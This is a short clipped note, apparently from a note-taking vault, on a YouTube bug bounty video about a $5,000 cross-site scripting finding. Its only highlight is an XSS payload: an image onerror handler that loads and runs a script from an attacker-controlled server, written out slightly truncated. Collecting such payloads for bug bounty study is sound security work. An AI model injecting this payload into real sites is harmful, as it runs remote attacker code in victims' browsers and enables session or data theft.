---
title: How a Mistake Earned a $5,000 Bug Bounty || Real Target Demonstration
Type: Video
published: 2026-07-25
Source: https://www.youtube.com/watch?v=ui7X0SmDDyw
Creator: "[[Tehlan]]"
date: 2026-07-29
tags:
  - Clippings
  - Video
  - Bugs/xss
Finished: false
Cover: https://www.youtube.com/img/desktop/yt_1200.png
Site: YouTube
---
## Highlights
XSS Payload:
```
<img/src/onerror='s=document.createElement("script");s.src="https://myserver/script.js";document.body.append(s
```